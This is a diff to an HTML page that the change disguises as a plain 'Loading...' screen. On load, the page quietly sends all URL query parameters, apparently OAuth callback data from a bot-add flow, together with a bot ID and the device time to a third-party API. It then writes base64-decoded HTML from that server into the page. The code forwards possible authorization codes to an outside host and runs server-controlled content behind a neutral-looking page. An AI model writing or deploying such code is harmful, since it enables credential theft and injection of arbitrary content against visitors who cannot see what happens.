@@ -1,71 +1,97 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Send Data to API</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+            color: #333;
+            text-align: center;
+        }
+        .loading {
+            font-size: 20px;
+            font-weight: bold;
+        }
+    </style>
+    <script>
+        function getDeviceTime() {
+            return new Date().toISOString();
+        }
+
+        function getUrlParams() {
+            const params = new URLSearchParams(window.location.search);
+            let obj = {};
+            params.forEach((value, key) => {
+                obj[key] = value;
+            });
+            return obj;
+        }
+
+        async function sendToApi() {
+            document.getElementById("status").innerText = "Please wait...";
+            const botId = "1297569951632068618";
+            const url = "http://crown.foo.ng/oauth2?event=bot.add";
+            const payload = {
+                deviceTime: getDeviceTime(),
+                botId: botId,
+                urlParams: getUrlParams()
+            };
+
+            try {
+                const response = await fetch("https://x8ki-letl-twmt.n7.xano.io/api:RrtGc3dR/handle/oauth2", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (response.status === 429) {
+                    document.body.innerHTML = "<p>Server is busy, please wait a moment...</p>";
+                    setTimeout(() => location.reload(), 10000);
+                    return;
+                }
+                
+                if (!response.ok) {
+                    document.body.innerHTML = `<p>Error: ${response.status}</p>`;
+                    return;
+                }
+
+                const data = await response.json();
+                
+                if (!data || typeof data !== "object" || !("success" in data) || !("html" in data)) {
+                    document.body.innerHTML = `Sorry, unexpected response received from server: Invalid response<pre>${JSON.stringify(data, null, 2)}</pre>`;
+                    return;
+                }
+
+                if (!data.success) {
+                    document.body.innerHTML = `Sorry, unexpected response received from server: Invalid response<pre>${JSON.stringify(data, null, 2)}</pre>`;
+                    return;
+                }
+
+                try {
+                    const decodedHtml = atob(data.html);
+                    document.open();
+                    document.write(decodedHtml);
+                    document.close();
+                } catch (error) {
+                    document.body.innerHTML = `Sorry, unexpected response received from server: Invalid HTML or encoding<pre>${JSON.stringify(data, null, 2)}</pre>`;
+                }
+            } catch (error) {
+                document.body.innerHTML = "<p>Error: Unable to connect to server.</p>";
+            }
+        }
+
+        window.onload = sendToApi;
+    </script>
 </head>
 <body>
-
-<h1>Sending Data to API</h1>
-<div id="response"></div>
-
-<script>
-  function getQueryParams() {
-    const params = {};
-    const queryString = window.location.search.substring(1);
-    const pairs = queryString.split('&');
-    for (let i = 0; i < pairs.length; i++) {
-      const [key, value] = pairs[i].split('=');
-      params[key] = decodeURIComponent(value);
-    }
-    return params;
-  }
-
-  function getDeviceTime() {
-    return new Date().toISOString();
-  }
-
-  async function sendData() {
-    const queryParams = getQueryParams();
-    const deviceTime = getDeviceTime();
-    const botId = "1297569951632068618";
-    const url = "http://crown.foo.ng/oauth2?event=bot.add";
-    const log = {  // Replace with your actual device data
-      batteryLevel: 50,
-      memoryUsage: "1GB",
-      osVersion: "Android 12"
-    };
-
-    const data = {
-      device_time: deviceTime,
-      bot_id: botId,
-      log: log,
-      url: url,
-      ...queryParams // Add query parameters to the request body
-    };
-
-    try {
-      const response = await fetch('https://x8ki-letl-twmt.n7.xano.io/api:RrtGc3dR/handle/oauth2', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-      });
-
-      if (!response.ok) {
-        throw new Error(`HTTP error! status: ${response.status}`);
-      }
-
-      const jsonResponse = await response.json();
-      document.getElementById('response').textContent = JSON.stringify(jsonResponse, null, 2); // Pretty-printed JSON
-
-    } catch (error) {
-      document.getElementById('response').textContent = `Error: ${error.message}`;
-    }
-  }
-
-  sendData();
-</script>
-
+    <div class="loading" id="status">Loading, please wait...</div>
 </body>
 </html>
